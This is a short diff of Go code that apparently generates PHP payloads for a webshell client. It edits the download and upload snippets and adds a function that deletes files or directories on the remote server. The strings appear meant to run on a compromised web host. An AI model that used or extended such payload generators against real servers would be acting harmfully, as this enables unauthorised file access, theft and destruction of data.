@@ -73,16 +73,15 @@ func CreateDownload(dir string) string {
     	header('Pragma: public');
 		header('Content-Length: ' . filesize('` + dir + `'));
 		header('Content-Disposition: attachment; filename='.basename('` + dir + `'));
-		ob_clean();flush();readfile('` + dir + `');exit();
+		readfile('` + dir + `');exit();
 	}`
 
 	return php
 }
 
 func CreateUpload(dir string) string {
-	return `$file=$_FILES['file'];
-	move_uploaded_file($file['tmp_name'], '" + dir + "');
-	if(file_exists('" + dir + "')){echo('` + normalizer.PHPEncode("1") + `');}`
+	return "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');" +
+		"if(file_exists('" + dir + "')){echo(" + normalizer.PHPEncode("1") + ");}"
 }
 
 func CreateListFile(scope string) string {
@@ -91,6 +90,10 @@ func CreateListFile(scope string) string {
 
 func CreateReadFile(file string) string {
 	return "$r=file_get_contents('" + file + "');"
+}
+
+func CreateDelete(scope string) string {
+	return "if(is_dir('" + scope + "')){$r=rmdir('" + scope + "');}else{$r=unlink('" + scope + "');}"
 }
 
 func CreateAnswer(method, parameter string) string {
